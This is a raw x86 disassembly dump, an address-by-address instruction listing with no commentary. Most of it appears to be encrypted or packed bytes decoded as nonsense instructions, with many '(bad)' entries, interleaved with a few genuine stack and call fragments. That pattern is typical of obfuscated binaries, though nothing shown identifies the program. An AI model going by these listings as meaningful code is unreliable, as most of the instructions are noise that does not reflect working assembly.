  407a5b:	mov    ss,WORD PTR [ecx+eiz*1]
  407a5e:	ror    dl,cl
  407a60:	jmp    0x407a60
  407a62:	nop
  407a63:	cli    
  407a64:	mov    BYTE PTR [edx],ah
  407a66:	scas   eax,DWORD PTR es:[edi]
  407a67:	cmp    edx,DWORD PTR cs:[ecx+0x38]
  407a6b:	cdq    
  407a6c:	pop    ebx
  407a6d:	int3   
  407a6e:	(bad)  
  407a6f:	fdivr  DWORD PTR [edx]
  407a71:	cmp    DWORD PTR [eax-0x28f1a999],ebp
  407a77:	sbb    BYTE PTR [edx],0x34
  407a7a:	rcl    DWORD PTR [edi-0x5005acd],0x8c
  407a81:	arpl   WORD PTR [edx],di
  407a83:	dec    edx
  407a84:	jle    0x407ac6
  407a86:	jnp    0x407ab0
  407a88:	jp     0x407b09
  407a8a:	or     eax,0xa1718c2c
  407a8f:	sub    DWORD PTR [ebx+0x731b1e89],0xffffffe1
  407a96:	jl     0x407a76
  407a98:	mov    ah,0xa2
  407a9a:	mov    edi,0x3984da9a
  407a9f:	repnz mov dl,0x26
  407aa2:	add    edi,DWORD PTR [edx+0x174242c2]
  407aa8:	mov    cl,0x5e
  407aaa:	fisubr WORD PTR [ecx+ebx*2-0x44]
  407aae:	fidivr DWORD PTR [edx]
  407ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ab1:	dec    ebx
  407ab2:	mov    BYTE PTR [edi+0xec0deb2],cl
  407ab8:	loopne 0x407ac0
  407aba:	cwde   
  407abb:	aaa    
  407abc:	inc    eax
  407abd:	mov    edi,0xed8bee1f
  407ac2:	push   0xfffffff4
  407ac4:	xchg   ebp,eax
  407ac5:	jmp    0x3a981aeb
  407aca:	enter  0x520f,0xaf
  407ace:	popa   
  407acf:	in     eax,0x69
  407ad1:	gs xor al,dh
  407ad4:	push   edi
  407ad5:	and    eax,0x9024cc76
  407ada:	ins    BYTE PTR es:[edi],dx
  407adb:	xor    ch,ch
  407add:	cmp    ebx,DWORD PTR [edi]
  407adf:	popa   
  407ae0:	pop    ecx
  407ae1:	dec    eax
  407ae2:	push   0x2b
  407ae4:	inc    esi
  407ae5:	stos   DWORD PTR es:[edi],eax
  407ae6:	pop    eax
  407ae7:	pcmpeqb mm6,QWORD PTR [ecx+ecx*2-0x47]
  407aec:	bound  ebp,QWORD PTR [edx]
  407aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af0:	je     0x407b38
  407af2:	push   ebx
  407af3:	pop    esi
  407af4:	inc    ecx
  407af5:	ficomp DWORD PTR [eax+0x3]
  407af8:	outs   dx,DWORD PTR ds:[esi]
  407af9:	hlt    
  407afa:	test   BYTE PTR cs:[ebx+0x71],ah
  407afe:	sahf   
  407aff:	push   ds
  407b00:	mov    eax,0x8df6d9c6
  407b05:	jbe    0x407b18
  407b07:	or     DWORD PTR [edi-0x1366c21c],ebx
  407b0d:	dec    esi
  407b0e:	int    0xb5
  407b10:	ror    BYTE PTR [eax],1
  407b12:	addr16 (bad) 
  407b14:	xor    ax,si
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	rcl    BYTE PTR [esi],1
  407b41:	xlat   BYTE PTR ds:[ebx]
  407b42:	rcl    DWORD PTR [edi-0x37],cl
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b6d
  407b4c:	xchg   edi,eax
  407b4d:	iret   
  407b4e:	xchg   esp,eax
  407b4f:	sar    BYTE PTR [ebx],cl
  407b51:	mov    WORD PTR [edx],?
  407b53:	pop    esi
  407b54:	fsubr  QWORD PTR [edi-0x7924a8ca]
  407b5a:	rcr    BYTE PTR [esi+0x36],cl
  407b5d:	push   ss
  407b5e:	or     al,0xa9
  407b60:	push   cs
  407b61:	pushw  0x34
  407b64:	popa   
  407b65:	add    eax,DWORD PTR [ebx]
  407b67:	frstor [eax+ecx*8]
  407b6a:	out    dx,al
  407b6b:	cli    
  407b6c:	in     eax,dx
  407b6d:	mov    ah,0x7a
  407b6f:	iret   
  407b70:	or     eax,0x9c84f035
  407b75:	scas   eax,DWORD PTR es:[edi]
  407b76:	fs repz leave 
  407b79:	ins    DWORD PTR es:[edi],dx
  407b7a:	arpl   sp,dx
  407b7c:	pop    edx
  407b7d:	gs stos BYTE PTR es:[edi],al
  407b7f:	adc    ebp,DWORD PTR [ecx-0x63]
  407b82:	rol    esi,0x3f
  407b85:	dec    edx
  407b86:	(bad)  
  407b88:	loopne 0x407b46
  407b8a:	cld    
  407b8b:	xor    esp,edx
  407b8d:	add    cl,dl
  407b8f:	pop    ecx
  407b90:	mov    BYTE PTR [esi],0x73
  407b93:	push   0xffffffad
  407b95:	out    0x4d,al
  407b97:	jne    0x407ba7
  407b99:	cmp    edx,eax
  407b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b9c:	jmp    0x407bf4
  407b9e:	retf   0x93f9
  407ba1:	in     al,0x18
  407ba3:	es data16 out dx,al
  407ba6:	pop    ss
  407ba7:	jg     0x407bc5
  407ba9:	inc    ebp
  407baa:	sti    
  407bab:	stc    
  407bac:	pop    ds
  407bad:	mov    bh,0x51
  407baf:	inc    edx
  407bb0:	xchg   esi,eax
  407bb1:	inc    eax
  407bb3:	cmp    al,0x34
  407bb5:	and    DWORD PTR [esi],esp
  407bb7:	mov    esp,DWORD PTR [eax+0x913c1d0]
  407bbd:	pushf  
  407bbe:	add    eax,0x71bd0843
  407bc3:	mov    DWORD PTR [ebp+0x72db4cba],ecx
  407bc9:	bound  edx,QWORD PTR [ebx-0x80]
  407bcc:	xor    ch,BYTE PTR [ebp+0x64]
  407bcf:	ficomp WORD PTR [esi-0x3fe2d5ec]
  407bd5:	les    ebx,FWORD PTR [ecx-0x7e]
  407bd8:	xor    DWORD PTR [ebx-0x725027fa],0xd8d39137
  407be2:	mov    esi,0xe0f66417
  407be7:	aaa    
  407be8:	mov    bl,0xa1
  407bea:	xchg   esi,eax
  407beb:	aas    
  407bec:	mov    bl,0x4d
  407bee:	add    DWORD PTR [edx],edi
  407bf0:	push   esi
  407bf1:	inc    esi
  407bf2:	sub    eax,0x1364343
  407bf7:	jmp    0xe414:0xe5200725
  407bfe:	pop    ds
  407bff:	leave  
  407c00:	inc    ebx
  407c01:	adc    al,0x5e
  407c03:	fs mov bh,dh
  407c06:	jnp    0x407c03
  407c08:	jne    0x407c55
  407c0a:	je     0x407c29
  407c0c:	jp     0x407bdb
  407c0e:	arpl   WORD PTR ds:0xc9860847,di
  407c14:	scas   al,BYTE PTR es:[edi]
  407c15:	ds dec eax
  407c17:	inc    ebx
  407c18:	push   0x63e5007d
  407c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c1e:	stos   BYTE PTR es:[edi],al
  407c1f:	mov    edx,ebp
  407c21:	push   0x31
  407c23:	jl     0x407c63
  407c25:	or     edx,ebx
  407c27:	jbe    0x407ca2
  407c29:	lahf   
  407c2a:	mov    eax,ds:0x32bf7f8b
  407c2f:	in     eax,0x22
  407c31:	jle    0x407c8d
  407c33:	add    BYTE PTR [ecx-0x100a2db1],bl
  407c39:	into   
  407c3a:	retf   0xbe76
  407c3d:	daa    
  407c3e:	dec    esp
  407c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c40:	aam    0x5f
  407c42:	hlt    
  407c43:	dec    esp
  407c44:	icebp  
  407c45:	cli    
  407c46:	pop    ss
  407c47:	cli    
  407c48:	daa    
  407c49:	sub    ah,BYTE PTR [ebp+eax*4+0xd79767b]
  407c50:	imul   esi,DWORD PTR [ebx-0x25],0xffffffc1
  407c54:	mov    ch,0x4a
  407c56:	loopne 0x407c4b
  407c58:	hlt    
  407c59:	sub    BYTE PTR [ecx+0x3bf3284f],cl
  407c5f:	add    bh,BYTE PTR [ecx-0x1fb3e41a]
  407c65:	(bad)
  407c68:	ficom  WORD PTR [ecx+ebx*4-0x2f]
  407c6c:	jnp    0x407c35
  407c6e:	ret    0x926a
  407c71:	je     0x407cd0
  407c73:	adc    esi,DWORD PTR [ecx+0x20]
  407c76:	or     al,0xc
  407c78:	jg     0x407cd8
  407c7a:	fdivr  DWORD PTR [edx]
  407c7c:	mov    ebp,0xbd8aa4a1
  407c81:	jns    0x407c25
  407c83:	mov    cl,BYTE PTR [edx]
  407c85:	cmp    al,0xc2
  407c87:	repnz pusha 
  407c89:	xchg   ebx,eax
  407c8a:	fs inc esp
  407c8c:	fmul   DWORD PTR [eax-0x2507d83a]
  407c92:	push   0xfffffff7
  407c94:	cli    
  407c95:	sub    al,0x99
  407c97:	xor    edi,0xffffff87
  407c9a:	sbb    dl,bl
  407c9c:	or     al,0x29
  407c9e:	ja     0x407c39
  407ca0:	lods   al,BYTE PTR ds:[esi]
  407ca1:	leave  
  407ca2:	sbb    eax,eax
  407ca4:	out    dx,al
  407ca5:	(bad)  
  407ca6:	xor    ebx,edx
  407ca8:	or     eax,0xbcfb2d8d
  407cad:	(bad)  
  407cae:	into   
  407caf:	push   ds
  407cb0:	test   DWORD PTR [esp+edi*4+0x64],esi
  407cb4:	jbe    0x407d2f
  407cb6:	fnstsw WORD PTR [eax-0x30]
  407cb9:	and    al,0x15
  407cbb:	sbb    BYTE PTR [edx+ebx*8-0x5b],dl
  407cbf:	xor    esp,DWORD PTR [eax]
  407cc1:	out    dx,eax
  407cc2:	in     al,0x41
  407cc4:	call   0xf87caac
  407cc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cca:	stc    
  407ccb:	in     eax,dx
  407ccc:	push   0xef4c4ac
  407cd1:	and    eax,0xfa1df434
  407cd6:	aad    0x6f
  407cd8:	xor    DWORD PTR [edi],esi
  407cda:	jns    0x407c93
  407cdc:	mov    BYTE PTR [esi-0x154af2ac],cl
  407ce2:	sub    DWORD PTR [eax-0x38],esp
  407ce5:	fadd   st,st(6)
  407ce7:	jmp    0xeaf9:0xd851c741
  407cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cef:	cmp    DWORD PTR [ebp-0x69038ab1],esi
  407cf5:	retf   
  407cf6:	iret   
  407cf7:	mov    BYTE PTR [edx+0x32022d0d],ch
  407cfd:	retf   0xe7ee
  407d00:	dec    ebp
  407d01:	adc    eax,0xc21e87f0
  407d06:	inc    ebp
  407d07:	push   ebp
  407d08:	inc    esi
  407d09:	mov    ecx,0x5afadd1c
  407d0e:	out    dx,al
  407d0f:	jl     0x407d7d
  407d11:	sub    al,0xff
  407d13:	dec    edi
  407d14:	inc    ebp
  407d15:	adc    eax,0xdd1a2ef4
  407d1a:	arpl   WORD PTR [ebx],di
  407d1c:	pop    ss
  407d1d:	add    al,0x64
  407d1f:	mov    al,ds:0xaba15a0c
  407d24:	retf   0x6360
  407d27:	sar    BYTE PTR [esi],cl
  407d29:	int    0xe0
  407d2b:	mov    ah,0x45
  407d2d:	ds push ebp
  407d2f:	jno    0x407d22
  407d31:	(bad)  
  407d32:	xor    BYTE PTR [edx+0x3e9a4be8],bl
  407d38:	add    BYTE PTR [ebp-0x30],ch
  407d3b:	dec    ecx
  407d3c:	inc    edi
  407d3d:	mov    al,ds:0xdbb65b97
  407d42:	call   0x90c1:0x81e6857a
  407d49:	adc    eax,0x2415c48a
  407d4e:	inc    ebp
  407d4f:	mov    dl,0xbf
  407d51:	(bad)  
  407d52:	test   al,0x61
  407d54:	in     eax,dx
  407d55:	aad    0x9b
  407d57:	lods   eax,DWORD PTR ds:[esi]
  407d58:	adc    eax,0x7c8cbbfb
  407d5d:	std    
  407d5e:	(bad)  
  407d5f:	jnp    0x407ce7
  407d61:	(bad)  
  407d62:	fcomp  DWORD PTR [ebp+0x65]
  407d65:	dec    ecx
  407d66:	or     BYTE PTR [edx-0x4b],cl
  407d69:	mov    bl,0xc
  407d6b:	inc    eax
  407d6c:	add    eax,0xce50db0d
  407d71:	inc    ebx
  407d72:	loopne 0x407dd6
  407d74:	jl     0x407d5d
  407d76:	test   ecx,ebx
  407d78:	jle    0x407d9d
  407d7a:	sbb    eax,0x10e95149
  407d7f:	and    eax,DWORD PTR [ebx-0x16]
  407d82:	mov    edx,DWORD PTR [ecx]
  407d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d85:	xlat   BYTE PTR ds:[ebx]
  407d86:	sbb    ah,BYTE PTR [ecx-0x53]
  407d89:	outs   dx,DWORD PTR ds:[esi]
  407d8a:	lods   eax,DWORD PTR ds:[esi]
  407d8b:	push   cs
  407d8c:	mov    dl,0xe9
  407d8e:	loopne 0x407d25
  407d90:	pop    esi
  407d91:	(bad)  
  407d92:	mov    ah,0xf
  407d94:	push   ebx
  407d95:	push   0xffffffb3
  407d97:	bound  ebx,QWORD PTR [eax-0x63]
  407d9a:	jns    0x407d7e
  407d9c:	fistp  WORD PTR ds:[edi+edx*2]
  407da0:	cwde   
  407da1:	mov    al,ds:0x80620865
  407da6:	mov    al,0xfc
  407da8:	popa   
  407da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407daa:	pop    ss
  407dab:	sub    eax,0xe8f4dc6d
  407db0:	push   ebx
  407db1:	sub    eax,0xddceb850
  407db6:	pop    edx
  407db7:	cmp    BYTE PTR [edx],0xc
  407dba:	push   0xffffff9d
  407dbc:	mov    esi,0x909dcd8f
  407dc1:	adc    BYTE PTR [esi+0x3d9339b6],dh
  407dc7:	cdq    
  407dc8:	or     BYTE PTR [edi],bl
  407dca:	mov    bl,0x19
  407dcc:	jmp    0x5a1d:0x8a1f4738
  407dd3:	xchg   edx,eax
  407dd4:	and    bl,BYTE PTR [ebp+0x33]
  407dd7:	int    0x59
  407dd9:	loop   0x407de2
  407ddb:	mov    ebp,0xfaead675
  407de0:	inc    esi
  407de1:	data16 icebp 
  407de3:	xorps  xmm7,XMMWORD PTR [edx+0x7]
  407de7:	mov    cs,WORD PTR [edi]
  407de9:	push   ebx
  407dea:	pop    es
  407deb:	pop    ebp
  407dec:	call   0xf9beb94a
  407df1:	ins    DWORD PTR es:[edi],dx
  407df2:	pop    ss
  407df3:	add    eax,0xfc4f9fc4
  407df8:	call   0xc3fb:0x32278447
  407dff:	adc    eax,0x54c51bab
  407e04:	cmc    
  407e05:	mov    bl,0xc0
  407e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e08:	jmp    0x29e3:0xae4519dd
  407e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e10:	push   0xffffffc1
  407e12:	adc    cl,bh
  407e14:	jns    0x407e93
  407e16:	and    al,BYTE PTR [edx-0x521ae8a7]
  407e1c:	dec    esp
  407e1d:	sub    al,cl
  407e1f:	stos   BYTE PTR es:[edi],al
  407e20:	or     edx,DWORD PTR [eax+ecx*2]
  407e23:	aas    
  407e24:	sti    
  407e25:	call   0x2cbc:0x9b88205c
  407e2c:	lods   eax,DWORD PTR ds:[esi]
  407e2d:	aad    0x21
  407e2f:	sahf   
  407e30:	adc    esi,DWORD PTR [ecx+esi*8+0x50c63767]
  407e37:	rcr    BYTE PTR [edx-0x4d],0xa3
  407e3b:	repz lea ecx,[ebp-0x22783194]
  407e42:	adc    al,0xde
  407e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e45:	mov    esi,edx
  407e47:	aam    0xa9
  407e49:	ss mov esp,0x76899e87
  407e4f:	iret   
  407e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e51:	aas    
  407e52:	mov    BYTE PTR [ebx+ebx*1-0x159ed5cb],bh
  407e59:	jns    0x407df8
  407e5b:	test   al,0xf
  407e5d:	fcomp  QWORD PTR [ebx+edx*1+0x17]
  407e61:	mov    edx,DWORD PTR [esi]
  407e63:	clc    
  407e64:	sti    
  407e65:	ds and ecx,esi
  407e68:	inc    ebx
  407e69:	jle    0x407e02
  407e6b:	xor    bh,BYTE PTR [ebp-0x7d352e7e]
  407e71:	jp     0x407eb0
  407e73:	inc    ebx
  407e74:	or     dx,di
  407e77:	mov    ds,WORD PTR [eax+0x3be81b3e]
  407e7d:	mov    ds:0x45890000,al
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	sub    cl,ah
  407e9a:	sbb    BYTE PTR [eax+0x7070d507],al
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407f08
  407ea5:	push   dx
  407ea7:	mov    dh,0xfd
  407ea9:	and    BYTE PTR [edx-0x60fe279b],dl
  407eaf:	and    esp,eax
  407eb1:	cmp    DWORD PTR [edi],esp
  407eb3:	je     0x407edb
  407eb5:	xor    BYTE PTR [edx],ah
  407eb7:	jne    0x407ee9
  407eb9:	das    
  407eba:	(bad)  
  407ebb:	cs jne 0x407f2b
  407ebe:	repnz mov ch,0xec
  407ec1:	jne    0x407f00
  407ec3:	(bad)  
  407ec4:	arpl   bx,si
  407ec6:	fs xchg edx,eax
  407ec8:	jnp    0x407ee1
  407eca:	pop    ebp
  407ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ecc:	sub    ebp,DWORD PTR [ebp+0x3fc7aec5]
  407ed2:	mov    esi,0xd68eef89
  407ed7:	push   ebx
  407ed8:	(bad)  
  407ed9:	mov    ds:0x5aca35d7,al
  407ede:	fisubr WORD PTR [esi]
  407ee0:	mov    cl,0x5c
  407ee2:	rcl    DWORD PTR [esi-0x25],cl
  407ee5:	nop
  407ee6:	ret    
  407ee7:	lds    edx,FWORD PTR [ecx+ebp*8-0x43]
  407eeb:	test   al,0xbb
  407eed:	ins    DWORD PTR es:[edi],dx
  407eee:	xchg   esp,eax
  407eef:	les    ecx,FWORD PTR [edi-0x51a5d22f]
  407ef5:	mov    bl,BYTE PTR [edi-0x27]
  407ef8:	jbe    0x407ef7
  407efa:	pop    ebp
  407efb:	cmp    al,BYTE PTR [ecx-0x28338124]
  407f01:	mov    ds:0xb8804864,al
  407f06:	int    0x67
  407f08:	repz adc esp,DWORD PTR [edx+0x68da55d0]
  407f0f:	mov    edi,0xc7da5fe9
  407f14:	in     al,dx
  407f15:	jmp    DWORD PTR [edi+0x10704dcc]
  407f1b:	stc    
  407f1c:	xor    eax,0xcb0f12
  407f21:	xchg   ebp,eax
  407f22:	jmp    FWORD PTR ss:[ebx+0x64]
  407f26:	in     al,dx
  407f27:	rcl    ebp,0xd3
  407f2a:	add    cl,ah
  407f2c:	lahf   
  407f2d:	xchg   edi,eax
  407f2e:	lods   al,BYTE PTR ds:[esi]
  407f2f:	les    eax,FWORD PTR [ecx]
  407f31:	into   
  407f32:	(bad)  
  407f33:	xlat   BYTE PTR ds:[ebx]
  407f34:	dec    esi
  407f35:	(bad)  
  407f36:	int3   
  407f37:	push   es
  407f38:	cld    
  407f39:	push   edi
  407f3a:	inc    edi
  407f3b:	(bad)  
  407f3c:	and    dl,al
  407f3e:	xor    DWORD PTR cs:[ebx-0x4c],edi
  407f42:	aaa    
  407f43:	or     ah,BYTE PTR [edx]
  407f45:	cmp    eax,0xf1b77d31
  407f4a:	push   ebx
  407f4b:	mov    ecx,0xd2393800
  407f50:	es or  edx,edi
  407f53:	nop
  407f54:	mov    dl,0xe
  407f56:	xchg   esi,eax
  407f57:	mov    bh,0x22
  407f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f5a:	popa   
  407f5b:	test   BYTE PTR [eax+0x48],cl
  407f5e:	pop    eax
  407f5f:	xchg   edi,eax
  407f60:	dec    edi
  407f61:	pop    ebx
  407f62:	shl    bh,0xb9
  407f65:	(bad)  
  407f67:	mov    eax,DWORD PTR [ecx-0x42]
  407f6a:	js     0x407fd6
  407f6c:	adc    dl,BYTE PTR [eax-0x14]
  407f6f:	fcom   QWORD PTR [esi+eiz*8]
  407f72:	add    BYTE PTR [ebx+0x1783bb54],0x6e
  407f79:	or     al,0x9
  407f7b:	sub    eax,0xd92054e0
  407f80:	push   eax
  407f81:	mov    dh,0xc6
  407f83:	fadd   DWORD PTR ds:0x760e7418
  407f89:	nop
  407f8a:	in     eax,dx
  407f8b:	dec    esp
  407f8c:	fsubr  st(5),st
  407f8e:	lock dec ecx
  407f90:	cwde   
  407f91:	int3   
  407f92:	or     eax,0x4cd34a03
  407f97:	jb     0x407fb7
  407f99:	(bad)  
  407f9a:	push   DWORD PTR [ebp+ebp*4+0x2f3504a3]
  407fa1:	neg    dl
  407fa3:	ficom  DWORD PTR [esi+esi*2-0x385df516]
  407faa:	(bad)  
  407fab:	into   
  407fac:	push   es
  407fad:	jg     0x407fd8
  407faf:	ins    DWORD PTR es:[edi],dx
  407fb0:	xchg   BYTE PTR [ecx+ebx*1],ah
  407fb3:	mov    esp,0xb2d63f75
  407fb8:	sbb    BYTE PTR [edx-0x1ef80026],dh
  407fbe:	outs   dx,BYTE PTR ds:[esi]
  407fbf:	xchg   esp,eax
  407fc0:	rcr    DWORD PTR [esi],cl
  407fc2:	mov    dl,0xfe
  407fc4:	ins    DWORD PTR es:[edi],dx
  407fc5:	add    eax,0x8b564f4a
  407fca:	stos   DWORD PTR es:[edi],eax
  407fcb:	sub    al,0x10
  407fcd:	ins    DWORD PTR es:[edi],dx
  407fce:	push   esi
  407fcf:	and    BYTE PTR [eax-0x1d2b1d96],ah
  407fd5:	mov    edx,ds
  407fd7:	sub    al,0xb7
  407fd9:	aas    
  407fda:	imul   esp,DWORD PTR [esi],0xe1aedff0
  407fe0:	sbb    eax,0x18107d39
  407fe5:	lea    esp,[ebp-0x6c9d1d49]
  407feb:	pop    esp
  407fec:	sbb    eax,0xcf79a4e3
  407ff1:	jmp    0x49113676
  407ff6:	jnp    0x407fab
  407ff8:	xchg   esp,esi
  407ffa:	sti    
  407ffb:	in     al,0xf2
  407ffd:	cmp    bh,BYTE PTR [ebx-0x5d]
  408000:	mov    ah,0x28
  408002:	inc    ecx
  408003:	and    ebp,edi
  408005:	dec    edx
  408006:	ja     0x408046
  408008:	jbe    0x408046
  40800a:	sub    DWORD PTR [ebp-0x3a8e0c84],0x41ad1f52
  408014:	int3   
  408015:	retf   0xa277
  408018:	dec    ecx
  408019:	mov    DWORD PTR [esi-0x13dc284c],ecx
  40801f:	and    esi,DWORD PTR [esi-0x1047299f]
  408025:	add    eax,0x60456570
  40802a:	int3   
  40802b:	jno    0x40806e
  40802d:	les    edx,FWORD PTR [eax]
  40802f:	and    DWORD PTR [ebx+esi*2],ebp
  408032:	mov    ecx,0x8dd0c46b
  408037:	call   0x3aacab42
  40803c:	fcmovb st,st(0)
  40803e:	xchg   DWORD PTR [ebx+eax*1-0x32],ecx
  408042:	mov    eax,DWORD PTR [edi]
  408044:	push   cs
  408045:	addr16 mov al,ds:0xe155
  408049:	cmp    al,0xf4
  40804b:	mov    edx,0x9cf71803
  408050:	jbe    0x407ffc
  408052:	retf   
  408053:	iret   
  408054:	(bad)  
  408055:	popf   
  408056:	inc    edx
  408057:	(bad)  
  408058:	sahf   
  408059:	or     DWORD PTR [edx-0xe],ebp
  40805c:	call   0xa7ed94d
  408061:	xor    ebp,DWORD PTR [edi+eiz*1-0x3f]
  408065:	push   eax
  408066:	cmp    al,0xce
  408068:	mov    esi,0xf83a5227
  40806d:	mov    edx,0x37473598
  408072:	or     BYTE PTR [edx-0x63],bl
  408075:	xor    eax,DWORD PTR ds:0x8a51ee22
  40807b:	es push eax
  40807d:	mov    ah,0x4b
  40807f:	pop    ebp
  408080:	nop
  408081:	dec    esi
  408082:	enter  0x172d,0x50
  408086:	cmp    BYTE PTR [ebx-0x552ea006],0x22
  40808d:	in     eax,0x70
  40808f:	(bad)  
  408090:	xor    eax,0xf3175cbb
  408095:	mov    WORD PTR [ebp+0x18],?
  408098:	cdq    
  408099:	adc    al,bl
  40809b:	iret   
  40809c:	mov    eax,0x4c3a281d
  4080a1:	pop    esp
  4080a2:	and    DWORD PTR [edx+0x7056d5e],esp
  4080a8:	xchg   ax,ax
  4080aa:	fistp  DWORD PTR [ebx+0x17]
  4080ad:	repz in eax,0xb4
  4080b0:	mov    al,ds:0xb5ba7cf0
  4080b5:	ins    DWORD PTR es:[edi],dx
  4080b6:	dec    DWORD PTR [ebp+0x573e29a7]
  4080bc:	cwde   
  4080bd:	mov    edx,0xbdf1aed5
  4080c2:	scas   al,BYTE PTR es:[edi]
  4080c3:	into   
  4080c4:	xchg   edi,eax
  4080c5:	cmc    
  4080c6:	aad    0x8d
  4080c8:	pop    ebp
  4080c9:	xchg   DWORD PTR fs:[edx],esi
  4080cc:	ins    DWORD PTR es:[edi],dx
  4080cd:	outs   dx,BYTE PTR ds:[esi]
  4080ce:	out    0x0,eax
  4080d0:	test   BYTE PTR [ebp-0x30e247e4],ah
  4080d6:	xor    DWORD PTR [ebx-0x1],esi
  4080d9:	shl    DWORD PTR [ebx+0x5d],0x6f
  4080dd:	xor    al,0xc1
  4080df:	(bad)  
  4080e0:	out    dx,eax
  4080e1:	call   0x1c61:0x87cf9af9
  4080e8:	loop   0x40811d
  4080ea:	or     eax,0xcd6966b0
  4080ef:	sub    eax,0xf1d11157
  4080f4:	inc    esp
  4080f5:	jmp    0xd3b78f20
  4080fa:	push   0x3a
  4080fc:	mov    eax,0x37137e93
  408101:	and    al,BYTE PTR [eax-0x19582ba8]
  408107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408108:	mov    eax,ds:0x2f3e99f7
  40810d:	fidiv  WORD PTR [ebp+0x30]
  408110:	arpl   WORD PTR [edx+0x1aeb4382],bp
  408116:	aad    0x66
  408118:	cld    
  408119:	gs not al
  40811c:	imul   ecx,DWORD PTR [ebx],0x8e628612
  408122:	or     BYTE PTR [ebp+ebx*1-0x5f],ch
  408126:	test   al,0x2d
  408128:	(bad)  
  408129:	xlat   BYTE PTR ds:[ebx]
  40812a:	iret   
  40812b:	sub    al,0xdf
  40812d:	jecxz  0x4080fe
  40812f:	sbb    BYTE PTR [edi],bh
  408131:	inc    esi
  408132:	les    esp,FWORD PTR [edi]
  408134:	adc    DWORD PTR [esi-0x4ce8ac63],eax
  40813a:	jno    0x4080c2
  40813c:	dec    ebp
  40813d:	popa   
  40813e:	aad    0xe2
  408140:	inc    esp
  408141:	xchg   BYTE PTR [edx],bl
  408143:	ds aad 0xa6
  408146:	(bad)  
  408147:	sti    
  408148:	ds mov esi,0xed01b2dd
  40814e:	ja     0x4081cb
  408150:	outs   dx,BYTE PTR ds:[esi]
  408151:	lea    edi,[edx-0x3ebb9277]
  408157:	aas    
  408158:	daa    
  408159:	test   eax,0x7bf55c43
  40815e:	test   DWORD PTR [ebx],0xf0844dc5
  408164:	ds add eax,0x5487294f
  40816a:	inc    ecx
  40816b:	pusha  
  40816c:	imul   edx,DWORD PTR [ecx+0x24],0xffffffd2
  408170:	lock cwde 
  408172:	xor    cl,BYTE PTR [edi+0x66]
  408175:	adc    DWORD PTR [edi+0x3a37955b],edx
  40817b:	sbb    eax,0xc469d794
  408180:	push   0x3f8e0e31
  408185:	adc    al,0x1d
  408187:	cwde   
  408188:	pop    eax
  408189:	rcpps  xmm3,XMMWORD PTR [esi-0x49f76fde]
  408190:	sub    edi,edx
  408192:	xchg   esp,eax
  408193:	mov    ecx,0x5050281f
  408198:	lahf   
  408199:	add    eax,0x1c059505
  40819e:	or     al,0xb5
  4081a0:	aad    0x7c
  4081a2:	add    edi,DWORD PTR [eax-0x60]
  4081a5:	popf   
  4081a6:	mov    ebp,0x2fe0f050
  4081ab:	push   cs
  4081ac:	in     eax,dx
  4081ad:	repz dec edx
  4081af:	and    al,0x81
  4081b1:	(bad)  [edx]
  4081b3:	adc    ecx,eax
  4081b5:	mov    al,ds:0xfe02c02f
  4081ba:	xchg   edx,eax
  4081bb:	gs loop 0x408141
  4081be:	adc    bh,BYTE PTR [ecx+0x8]
  4081c1:	pop    ds
  4081c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081c3:	aaa    
  4081c4:	js     0x4081c8
  4081c6:	inc    ebx
  4081c7:	inc    ecx
  4081c8:	bnd jo 0x4081d8
  4081cb:	sbb    eax,0x318f6791
  4081d0:	bound  ecx,QWORD PTR [eax]
  4081d2:	pop    ds
  4081d3:	jecxz  0x408162
  4081d5:	inc    ebp
  4081d6:	add    al,0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
